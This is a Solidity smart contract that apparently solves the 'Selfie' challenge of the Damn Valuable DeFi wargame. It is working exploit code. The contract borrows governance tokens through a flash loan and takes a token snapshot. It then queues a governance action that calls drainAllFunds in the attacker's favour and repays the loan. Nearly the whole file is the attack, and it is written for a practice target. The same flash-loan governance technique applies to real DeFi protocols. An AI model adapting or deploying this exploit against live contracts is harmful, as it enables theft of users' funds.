// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../DamnValuableTokenSnapshot.sol';

/*
  - attacker initiates flash loan
  - receiveTokens is invoked
  - create callData with function signature for drainAllFunds
  - queue the action in the governance contract
*/

interface IFlashLoanReceiver {
  function receiveTokens(address token, uint256 borrowAmount) external;
}

interface ISelfiePool {
  function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
  function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external;
  function executeAction(uint256 actionId) external payable;
}

contract AttackSelfie is IFlashLoanReceiver {
  ISelfiePool internal pool;
  ISimpleGovernance internal governance;
  DamnValuableTokenSnapshot internal DVTtoken;
  uint256 immutable amount;
  address attacker;

  constructor(address _pool, address _governance, address _token, uint256 _amount) {
    pool = ISelfiePool(_pool);
    governance = ISimpleGovernance(_governance);
    DVTtoken = DamnValuableTokenSnapshot(_token);
    amount = _amount;
  }

  function attack() external {
    // define attacker address
    attacker = msg.sender;

    // initiate the flashLoan
    pool.flashLoan(amount);
  }

  function receiveTokens(
    address token,
    uint256 borrowAmount
  ) external override {
    // take snapshot as required by the action execution
    DVTtoken.snapshot();

    // create callData for drainAllFunds
    bytes memory payload = abi.encodeWithSignature(
      'drainAllFunds(address)',
      attacker
    );

    // queue the action
    governance.queueAction(
      address(pool),
      payload,
      0
    );

    // transfer back to the contract
    DVTtoken.transfer(msg.sender, borrowAmount);
  }
}
